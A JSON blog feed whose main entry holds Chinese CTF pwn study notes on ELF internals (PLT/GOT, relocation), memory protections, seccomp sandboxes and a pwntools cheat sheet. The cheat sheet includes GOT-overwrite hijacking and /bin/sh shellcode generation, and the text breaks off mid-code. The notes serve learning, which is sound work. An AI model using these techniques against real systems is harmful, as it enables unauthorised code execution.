{
    "version": "https://jsonfeed.org/version/1",
    "title": "alazymachine",
    "description": "",
    "home_page_url": "https://alazymechnaic.github.io",
    "items": [
        {
            "id": "https://alazymechnaic.github.io/2024/04/08/cong-ling-kai-shi-xie-yi-ge-pe-ke/",
            "url": "https://alazymechnaic.github.io/2024/04/08/cong-ling-kai-shi-xie-yi-ge-pe-ke/",
            "title": "从零开始写一个PE壳",
            "date_published": "2024-04-08T14:20:05.000Z",
            "content_html": "<p><a href=\"https://blog.csdn.net/weixin_44531336/article/details/124958499\">https://blog.csdn.net/weixin_44531336/article/details/124958499</a></p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-an-quan-ji-chu/",
            "url": "https://alazymechnaic.github.io/2024/04/08/er-jin-zhi-an-quan-ji-chu/",
            "title": "二进制安全基础",
            "date_published": "2024-04-08T09:05:35.000Z",
            "content_html": "<h2 id=\"需要装的工具\"><a href=\"#需要装的工具\" class=\"headerlink\" title=\"需要装的工具\"></a>需要装的工具</h2><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706632.png\" alt=\"image-20220929231115939\"></p>\n<h2 id=\"常见命令\"><a href=\"#常见命令\" class=\"headerlink\" title=\"常见命令\"></a>常见命令</h2><figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\">## 反汇编指令</span><br>objdump -d -M intel<br>readelf -a <span class=\"hljs-comment\"># 输出所有的elf的文件信息</span><br>nm <span class=\"hljs-comment\"># 用于看所有的函数</span><br>hexdump <span class=\"hljs-comment\"># 用于查看十六进制</span><br><br>ldd <span class=\"hljs-comment\"># 查看使用的函数所在动态链接库的位置</span><br><br><span class=\"hljs-comment\"># GCC的使用</span><br>gcc 文件.C -s 目标.s  <span class=\"hljs-comment\"># 该指令得到的是一个汇编指令构成的asc码文件，但是得到的是att的汇编指令</span><br>gcc -no-pie <span class=\"hljs-comment\"># 关闭pie</span><br>gcc -m32 <span class=\"hljs-comment\"># 进行32位编译，需要装一些依赖</span><br>gcc -static <span class=\"hljs-comment\">#使用静态链接,也就是将动态链接库直接写进二进制文件中，call的时候是一个实际地址，正常连接的时候call的是一个偏移量</span><br>-fomit-frame-pointer <span class=\"hljs-comment\"># 编译后就忽略rbp寄存器，代码里也就没有开栈操作，直接依照rsp间接寻址</span><br>-fno-omit-frame-pointer <span class=\"hljs-comment\"># 保留push rbp, mov rsp,rbp</span><br>-O1 <span class=\"hljs-comment\"># 默认的编译优化等级，O3后就有可能会将某些代码优化，导致攻击失败</span><br>-no-pie <span class=\"hljs-comment\"># 关闭地址随机化</span><br>gcc -fno-stack-protector -o <span class=\"hljs-built_in\">test</span> test.c //禁用栈保护<br>gcc -fstack-protector -o <span class=\"hljs-built_in\">test</span> test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码<br>gcc -fstack-protector-all -o <span class=\"hljs-built_in\">test</span> test.c //启用堆栈保护，为所有函数插入保护代码<br>-z execstack / -z noexecstack (关闭 / 开启) 栈保护<br><span class=\"hljs-comment\"># gdb指令</span><br>-Wl,--dynamic-linker=/动态连接器的路径/ld-linux-x86-64.so.2 <span class=\"hljs-comment\">#指定libc版本编译</span><br><br>distance addr_a addr_b <span class=\"hljs-comment\"># 计算两个地址之间有多远</span><br></code></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"常见容易混淆概念\"><a href=\"#常见容易混淆概念\" class=\"headerlink\" title=\"常见容易混淆概念\"></a>常见容易混淆概念</h2><ul>\n<li>编译是由编译器完成的，高级语言的代码由编译器将其变为汇编代码（也就是gcc -s后得到的东西），这个根据使用的编译器不同，得到的结果也不同</li>\n<li>汇编 则是将汇编代码变成机器码，这个是没有异议的，完全相同。</li>\n<li>64位后的各种指令架构的寄存器，除了rip和flag寄存器外，其余都可以随便用。<ul>\n<li>RSP存放的是当前的栈顶的地址：surface？</li>\n<li>RBP是用于存放当前栈帧的栈底地址：base？</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"关于-plt与-got\"><a href=\"#关于-plt与-got\" class=\"headerlink\" title=\"关于.plt与.got\"></a>关于.plt与.got</h2><h3 id=\"延迟绑定技术\"><a href=\"#延迟绑定技术\" class=\"headerlink\" title=\"延迟绑定技术\"></a>延迟绑定技术</h3><p>由于在实际运行的过程中并不会将外部函数的地址写到elf文件中，因为在装载动态链接库的时候会对动态链接库进行重定位。延迟绑定主要依赖的是plt，plt表其实是一种模糊的引用方式。这种方式用于避免在实际动态加载so的时候，一次性将所有的动态链接库加载进来，而是用到哪个加载哪个。主要依赖于_dl_runtime_resovlve(module, function)函数来实现。动态链接库加载进入内存地址后</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706623.png\" alt=\"image-20220926234935798\"></p>\n<ul>\n<li>由上图基本上能够得到一个完整的流程，上图是外部函数在首次执行时的情况</li>\n<li>首先在call指令执行过后会直接到plt表的对应表项中，该表由三条指令构成<ul>\n<li>第一条指令是个jmp *addr，初始状态下该addr中存储的内容其实就是jmp的下一条指令，也就是下面的push，其实就是直接走向下条指令</li>\n<li>第二条指令是将向栈中push一个值，这个值的目的是用于索引当前要找的是哪个函数，这个后面会提到</li>\n<li>第三条指令直接是个无条件跳转，这个跳转就是无脑跳转到一个固定的地址，这个地址就是_dl_runtime_resolve函数的位置，该函数位于代码段，有该函数来帮助程序找到对应的代码位置。其实这个函数也需要一个plt表项，因此这一步跳转的位置还是在所谓common@plt为的位置。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706643.png\" alt=\"image-20220926235654981\"></p>\n<ul>\n<li>_dl_runtime_resolve会去做两件事，一件事是将plt表的第一项，也就是那个间接的jmp *addr中addr所存储的内容改为真正的函数地址（其实这个addr就是在got范围内的），这样在第二次使用该函数的时候就不必再用到got。<ul>\n<li>那么这个函数是怎么找到对应的函数的呢？elf文件中保存了.rel.plt保存了重定位表的信息，该重定位表中存储了该函数对应的got表项的地址，也就是上面的jmp *addr中的addr</li>\n</ul>\n</li>\n<li>根据上面能够看到plt表的第一个就是_dl_runtime_resolve函数的表项，其对应的内容在got[2]的位置，前两个分别是.dynamic段的装载地址和本ELF的link_map数据及结构描述符地址。但在编译时，无法获取知道link_map地址和_dl_runtime_resolve函数地址，所以编译时填零地址，进程启动时由动态链接器进行填充</li>\n<li>注意！plt段在text段，可读可执行，got表在data段，可读可写（因此也有了覆盖got技术）</li>\n</ul>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706651.png\" alt=\"image-20220927000902698\"></p>\n<p>在使用之后就可以直接跳转</p>\n<ul>\n<li><p>因此可以使用覆盖got表的方式，来劫持控制流，但是如果开启relo之后就不行了</p>\n</li>\n<li><p>防御方式：</p>\n</li>\n<li><p>Partial RELRO</p>\n<pre><code class=\"hljs\">现在gcc 默认编译就是 partial relro\nsome sections(.init_array .fini_array .jcr .dynamic .got) are marked as read-only after they have been initialized by the dynamic loader\nnon-PLT GOT is read-only (.got)\nGOT is still writeable (.got.plt)\n</code></pre>\n<p>Full RELRO</p>\n<pre><code class=\"hljs\">拥有 Partial RELRO 的所有特性\nlazy resolution 是被禁止的，所有导入的符号都在 startup time 被解析\nbonus: the entire GOT is also (re)mapped as read-only or the .got.plt section is completely initialized with the final addresses of the target functions (Merge .got and .got.plt to one section .got). Moreover,since lazy resolution is not enabled, the GOT[1] and GOT[2] entries are not initialized. GOT[0] is a the address of the module’s DYNAMIC section. GOT[1] is the virtual load address of the link_map, GOT[2] is the address for the runtime resolver function。\n</code></pre>\n</li>\n<li><p>关于.got.plt表，其实是got表的一部分，用来存储链接后的地址</p>\n</li>\n</ul>\n<h3 id=\"rel-plt\"><a href=\"#rel-plt\" class=\"headerlink\" title=\".rel.plt\"></a>.rel.plt</h3><p>.rel.plt节里面记录的是重定位表的信息，所有外部过程调用符号的重定位信息会出现在这个节区中。与之类似的节区还有个.rel.dyn节，这里面的每个表项对应了除了外部过程调用的符号以外的所有重定位对象，比如引用外部的全局变量等。.rel.dyn和.rel.plt节中每个重定位项记录了重定位的操作地址（r_offset），重定位类型的信息和符号的符号表索引（r_info），这两个节区实际上就是Elf32_Rel/Elf64_Rel结构体数组。</p>\n<h3 id=\"plt\"><a href=\"#plt\" class=\"headerlink\" title=\".plt\"></a>.plt</h3><p>.plt节中存放的是需要重定位的外部调用的符号，.plt[0]存放的是更新GOT表中动态链接符号加载地址的操作——将.got.plt[1]中存放的link_map结构体压入栈作为下一步的函数参数，跳转到.got.plt[2]执行动态链接器符号解析函数_dl_runtime_resolve。在延迟绑定场景，.plt[0]的执行会在外部函数第一次调用的时候进行，在该场景中符号的GOT表内容会被初始化为.plt[0]的地址，在执行过plt[0]的操作后会被更新为符号的加载地址</p>\n<h3 id=\"plt-got\"><a href=\"#plt-got\" class=\"headerlink\" title=\".plt.got\"></a>.plt.got</h3><p>.plt.got节是用于存放 __cxa_finalize 函数对应的 PLT 条目。</p>\n<h3 id=\"got\"><a href=\"#got\" class=\"headerlink\" title=\".got\"></a>.got</h3><p>.got节是运行时只读的，可以用于存放全局变量的地址，也可以用于存放不需要延迟绑定的函数的地址。所以很明显，got表是不能动的，相反，got.plt是能动的</p>\n<h3 id=\"got-plt\"><a href=\"#got-plt\" class=\"headerlink\" title=\".got.plt\"></a>.got.plt</h3><p>.got.plt是运行时可读写的，在延迟绑定过程中与 .plt 一起使用，如果关闭了延迟绑定则没有该节。<br>.got.plt[1]存放了link_map结构体的地址，.gotplt[2]存放了_dl_runtime_resolve函数的地址，后面的各项则用于存放函数的加载地址，在使用延迟绑定的时候这些项里会统一初始化为.plt[0]的地址，用于执行_dl_runtime_resolve函数，在执行完成后会被重新初始化为函数的加载地址，在下一次调用的时候就会直接调用了，因此.got.plt必须是运行时可读写的</p>\n<h3 id=\"rel-dyn\"><a href=\"#rel-dyn\" class=\"headerlink\" title=\".rel.dyn\"></a>.rel.dyn</h3><p><a href=\"https://so.csdn.net/so/search?q=%E9%87%8D%E5%AE%9A%E5%90%91&amp;spm=1001.2101.3001.7020\">重定向</a>表，在程序启动时就需要重定位完成。</p>\n<h4 id=\"rel-plt-1\"><a href=\"#rel-plt-1\" class=\"headerlink\" title=\".rel.plt\"></a>.rel.plt</h4><p>保存了重定位表的信息，可以使用lazy的连接方式</p>\n<h3 id=\"fini和init段\"><a href=\"#fini和init段\" class=\"headerlink\" title=\"fini和init段\"></a>fini和init段</h3><p>init_array数组里面的函数都会一一执行，而且main函数结束后还会执行fini_array数组里面的函数，并且倒序执行</p>\n<h2 id=\"重定位表（Relocation-Table）\"><a href=\"#重定位表（Relocation-Table）\" class=\"headerlink\" title=\"重定位表（Relocation Table）\"></a>重定位表（Relocation Table）</h2><ul>\n<li>重定位表（Relocation Table）用于在程序加载到内存中时，进行内存地址的修正。为什么要进行内存地址的修正？我们举个例子来说：test.exe可执行程序需要三个动态链接库dll（a.dll，b.dll，c.dll），<strong>假设test.exe的ImageBase为400000H，而a.dll、b.dll、c.dll的基址ImageBase均为1000000H</strong>。 </li>\n<li>因此在装载到内存中时，每个库肯定不会装载到1000000H的位置，但是每个库中存在一些写死的地址，这个地址是与1000000H相关的绝对地址。因此需要在使用的时候进行修正，由于每个动态链接库所装载的位置不相同，需要一个数据结构来记录这些偏移，这个修正的数据结构就是重定位表。</li>\n</ul>\n<p><a href=\"https://www.freesion.com/article/7648134308/\">https://www.freesion.com/article/7648134308/</a></p>\n<h3 id=\"动态链接库操作\"><a href=\"#动态链接库操作\" class=\"headerlink\" title=\"动态链接库操作\"></a>动态链接库操作</h3><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"># 构造两个文件，一个a.h,一个a.c，a.c就正常声明函数<br><span class=\"hljs-comment\">// a.c</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">\"a.h\"</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">hello</span><span class=\"hljs-params\">()</span><br>{<br>    <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"this is in hello...\\n\"</span>);<br>}<br><span class=\"hljs-comment\">// a.h 的作用相当于对文件中的函数做一个注册行为</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">hello</span><span class=\"hljs-params\">()</span>;<br><br><span class=\"hljs-comment\">// 需要使用的文件中直接进行include head文件即可</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">\"hello.h\"</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">()</span><br>{<br>    hello();<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br><br><span class=\"hljs-comment\">// gcc hello.c -shared -fPIC -o libhello.so # 用于生成动态链接库，此处的</span><br><span class=\"hljs-comment\">// 在使用动态链接库的时候只要进行在文件中进行include一下a.h即可  gcc test.c -L. -l hello  -no-pie -o testhello, </span><br><span class=\"hljs-comment\">// -L 表明使用的动态链接库在当前文件夹下，-l 后面跟动态链接库的名称，编译器会自动在前后补齐lib和.so的部分</span><br><span class=\"hljs-comment\">// export LD_LIBRARY_PATH=~/Desktop/Test_Project/getso:$LD_LIBRARY_PATH 执行完该指令后才会从目标路径中找到对应的库文件，否则显示找不到动态链接库</span><br><span class=\"hljs-comment\">// ldd file 指令用于查看当前文件中的动态链接库依赖有哪些</span><br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h2 id=\"常见的内存保护方式\"><a href=\"#常见的内存保护方式\" class=\"headerlink\" title=\"常见的内存保护方式\"></a>常见的内存保护方式</h2><h3 id=\"NX（No-execute）：\"><a href=\"#NX（No-execute）：\" class=\"headerlink\" title=\"NX（No-execute）：\"></a>NX（No-execute）：</h3><p>.data .bss等标记为不可执行，堆栈等均不可执行，传统的修改GOT表的方式不再可行。但是无法阻止代码重用攻击ret2libc。编译时加入-z execstack参数即可关闭该保护方式</p>\n<h3 id=\"stack-canaries：\"><a href=\"#stack-canaries：\" class=\"headerlink\" title=\"stack canaries：\"></a>stack canaries：</h3><p>栈保护机制，当该机制开启时会在栈中压入一个随机值，防止进行栈溢出后，该随机值被修改，使用-fno-stack-protector编译选项则会关闭程序的stack canary。canary的值位于rbp上面，也就是在push rbp之后才会开始完成的内容</p>\n<p>在函数执行结束后会有检查canary内容是否和先前相似的代码，如果不同则返回stack_chk_fail</p>\n<h3 id=\"RELO\"><a href=\"#RELO\" class=\"headerlink\" title=\"RELO\"></a>RELO</h3><ul>\n<li>重定位机制</li>\n<li>Partial RELO的got表本身是可写的，但是full relo的重定位表本身不可写</li>\n<li></li>\n</ul>\n<h3 id=\"ASLR与PIE\"><a href=\"#ASLR与PIE\" class=\"headerlink\" title=\"ASLR与PIE\"></a>ASLR与PIE</h3><h4 id=\"ASLR：\"><a href=\"#ASLR：\" class=\"headerlink\" title=\"ASLR：\"></a>ASLR：</h4><ul>\n<li>address space layout randomizatio: 也就是地址空间随机化，是一种系统功能，在系统将文件装入内存时产生作用，主要针对的内容如下：<ul>\n<li>栈基地址，共享库，mmap基地址，堆地址（这也就是为什么开了ASLR后需要进行堆基地址的泄露</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"PIE：\"><a href=\"#PIE：\" class=\"headerlink\" title=\"PIE：\"></a>PIE：</h4><ul>\n<li>Position - Independent Executable，编译器的功能之一，其主要目的在于对代码段，数据段以及bss段的随机化，将程序的基地址加载到一个任意位置（但是各个段之间的相对位置是固定的）</li>\n<li>关闭地址随机化后，静态地址就是实际运行地址。开启pie后，静态编译的地址就只是单纯的偏移量</li>\n</ul>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202404081706659.png\" alt=\"image-20221002153747977\"></p>\n<h2 id=\"不常见的保护方式\"><a href=\"#不常见的保护方式\" class=\"headerlink\" title=\"不常见的保护方式\"></a>不常见的保护方式</h2><h3 id=\"沙箱保护ORW\"><a href=\"#沙箱保护ORW\" class=\"headerlink\" title=\"沙箱保护ORW\"></a>沙箱保护ORW</h3><p>​\t沙盒机制也就是我们常说的沙箱，英文名 sandbox ，是计算机领域的虚拟技术，常见于安全方向。一般说来，我们会将不受信任的软件放在沙箱中运行，一旦该软件有恶意行为，则禁止该程序的进一步运行，不会对真实系统造成任何危害。在 ctf 的 pwn 题中一般有两种函数调用方式实现沙盒机制，第一种是对 prctl 函数调用，第二种是使用 seccomp 库函数。</p>\n<h4 id=\"prctl函数\"><a href=\"#prctl函数\" class=\"headerlink\" title=\"prctl函数\"></a>prctl函数</h4><figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/prctl.h&gt;</span> </span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">prctl</span><span class=\"hljs-params\">(<span class=\"hljs-type\">int</span> option, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg2, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg3, <span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg4,<span class=\"hljs-type\">unsigned</span> <span class=\"hljs-type\">long</span> arg5)</span>; <br></code></pre></td></tr></tbody></table></figure>\n\n<p>这个函数有 5 个参数，重点是 option 参数，这里主要关注 2 点：</p>\n<ul>\n<li>PR_SET_NO_NEW_PRIVS(38)</li>\n<li>PR_SET_SECCOMP(22)</li>\n</ul>\n<p>若option为PR_SET_NO_NEW_PRIVS(38)：</p>\n<ul>\n<li>第二个参数arg2设置为1，那么程序将不能通过执行execve系统调用来获得提权。</li>\n</ul>\n<p>若option为PR_SET_SECCOMP(22)：</p>\n<ul>\n<li>表示可以设置沙箱规则，也就是可以自定义函数的系统调用是被允许还是禁止。</li>\n</ul>\n<p>如果arg2为SECCOMP_MODE_STRICT(1),则只允许调用read，write，_exit（not exit_group），sigreturn这几个syscall。</p>\n<p>如果arg2为SECCOMP_MODE_FILTER(2),则为过滤模式，其中对syscall的限制通过参数3的结构体，来自定义过滤规则。</p>\n<p>总结起来，就是prctl(38, 1LL, 0LL, 0LL, 0LL)表示禁用系统调用，也就是 system 和 onegadget 都没了,而 prctl(22，2) 表示设置沙箱规则，从而可以实现改变函数的系统调用。</p>\n<h4 id=\"seccomp\"><a href=\"#seccomp\" class=\"headerlink\" title=\"seccomp\"></a>seccomp</h4><p>​\tseccomp是 secure computing 的缩写，其是 Linux kernel 引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式。</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\">v1 = seccomp_init(<span class=\"hljs-number\">0LL</span>);<br><span class=\"hljs-keyword\">if</span> ( !v1 )<br>{<br>  <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">\"seccomp error\"</span>);<br>  <span class=\"hljs-built_in\">exit</span>(<span class=\"hljs-number\">0</span>);<br>}<br> <br><span class=\"hljs-comment\">// seccomp_rule_add添加规则</span><br><span class=\"hljs-comment\">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>seccomp_rule_add(v1, <span class=\"hljs-number\">0x7FFF0000</span>LL, <span class=\"hljs-number\">2LL</span>, <span class=\"hljs-number\">0LL</span>);<br>seccomp_rule_add(v1, <span class=\"hljs-number\">0x7FFF0000</span>LL, <span class=\"hljs-number\">0LL</span>, <span class=\"hljs-number\">0LL</span>);<br>seccomp_rule_add(v1, <span class=\"hljs-number\">0x7FFF0000</span>LL, <span class=\"hljs-number\">1LL</span>, <span class=\"hljs-number\">0LL</span>);<br>seccomp_rule_add(v1, <span class=\"hljs-number\">0x7FFF0000</span>LL, <span class=\"hljs-number\">60LL</span>, <span class=\"hljs-number\">0LL</span>);<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t首先调用seccomp_init(arg)对结构体进行初始化，若参数arg为SCMP_ACT_ALLOW(0x7fff0000U)，则为黑名单模式，没有匹配到规则的系统调用将被默认允许。若参数为SCMP_ACT_KILL(0x00000000U)，则为白名单模式，没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。</p>\n<p><a href=\"https://blog.csdn.net/qq_45595732/article/details/125472253\">https://blog.csdn.net/qq_45595732/article/details/125472253</a></p>\n<figure class=\"highlight\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">构造沙箱，检查沙箱工具<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<h3 id=\"关于endbr64\"><a href=\"#关于endbr64\" class=\"headerlink\" title=\"关于endbr64\"></a>关于endbr64</h3><p>​\t在间接跳转之后查看下一条指令是不是endbr64。如果指令是endbr64指令，那么该指令会将CPU状态从WAIT_FOR_ENDBRANCH恢复成DLE。另一方面，如果下一条指令不是endbr64，说明程序可能被控制流劫持了，CPU就报错（#CP）。因为按照正确的逻辑，<strong>间接跳转后应该需要有一条对应的endbr64指令来回应间接跳转，如果不是endbr64指令，那么程序控制流可能被劫持并前往其它地址</strong>（其它任意地址上是以非endbr64开始的汇编代码）。</p>\n<p>​\t这里关于间接跳转与直接跳转之间的区别，直接跳转是写死一个目标标签地址，间接跳转则是通过对一个标签指向的内容进行跳转</p>\n<p>​\t简单来说就是intel新加的一条安全性检查的指令，大部分情况下视作nop即可，但这条指令事实上已用到最新版本的libc中，如果你的libc版本足够新且CPU也不是十多年前的古董的话大概率libc库函数第一条指令就是endbr 64，而这和服务器上是不一致，因此是有可能出现在本地打不通，在远程能够打通的情况。</p>\n<h2 id=\"IDA操作\"><a href=\"#IDA操作\" class=\"headerlink\" title=\"IDA操作\"></a>IDA操作</h2><ul>\n<li>有些字符串在数据段中，并不能通过字符串窗口</li>\n</ul>\n<h2 id=\"使用python打pwn\"><a href=\"#使用python打pwn\" class=\"headerlink\" title=\"使用python打pwn\"></a>使用python打pwn</h2><figure class=\"highlight python\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> * <br>p=process(<span class=\"hljs-string\">'./test'</span>) <span class=\"hljs-comment\"># 本地打</span><br>p=remote(<span class=\"hljs-string\">\"127.0.0.1\"</span>, <span class=\"hljs-number\">10011</span>) <span class=\"hljs-comment\"># 进行远程打</span><br>context.log_level = <span class=\"hljs-string\">'DEBUG'</span> <span class=\"hljs-comment\">#  设置调试标准</span><br>context(log_level=<span class=\"hljs-string\">\"debug\"</span>, arch=<span class=\"hljs-string\">\"i386\"</span>, os=<span class=\"hljs-string\">\"linux\"</span>)<br>gdb.attach(p) <span class=\"hljs-comment\"># 使用gdb调试，这时候就会弹出一个gdb窗口</span><br>p.close() <span class=\"hljs-comment\"># 关闭远程链接</span><br>p32(<span class=\"hljs-number\">0x1000</span>) <span class=\"hljs-comment\"># 将其变为一个32位的地址,注意使用的是小端序字节，不足32位的部分补0x00</span><br>p64(<span class=\"hljs-number\">0x1000</span>) <span class=\"hljs-comment\"># 与上面同理</span><br>p.sendline(parameter) <span class=\"hljs-comment\"># 发送数据，默认后面加\"\\n\"</span><br>p.recvuntil(“<span class=\"hljs-built_in\">input</span>:”)<br>send(payload) <span class=\"hljs-comment\"># 发送payload</span><br>sendline(payload) <span class=\"hljs-comment\"># 发送payload，并进行换行（末尾\\n）</span><br>recvn(N) <span class=\"hljs-comment\"># 接受 N(数字) 字符</span><br>recvline() <span class=\"hljs-comment\"># 接收一行输出</span><br>recvlines(N) <span class=\"hljs-comment\"># 接收 N(数字) 行输出</span><br>recvuntil(some_string) <span class=\"hljs-comment\"># 接收到 some_string 为止</span><br>asm(<span class=\"hljs-string\">'mov eax, 0'</span>) <span class=\"hljs-comment\"># 汇编成机器码,得到的是字节码</span><br>shellcraft.arm <span class=\"hljs-comment\"># 是ARM架构的，</span><br>shellcraft.amd64<span class=\"hljs-comment\"># 是AMD64架构，</span><br>shellcraft.i386<span class=\"hljs-comment\"># 是Intel 80386架构的，</span><br>shellcraft.common<span class=\"hljs-comment\"># 是所有架构通用的</span><br>asm(shellcraft.sh()) <span class=\"hljs-comment\"># 生成/bin/sh 的shellcode</span><br>context(os=<span class=\"hljs-string\">'linux'</span>, arch=<span class=\"hljs-string\">'amd64'</span>, log_level=<span class=\"hljs-string\">'debug'</span>) <span class=\"hljs-comment\"># 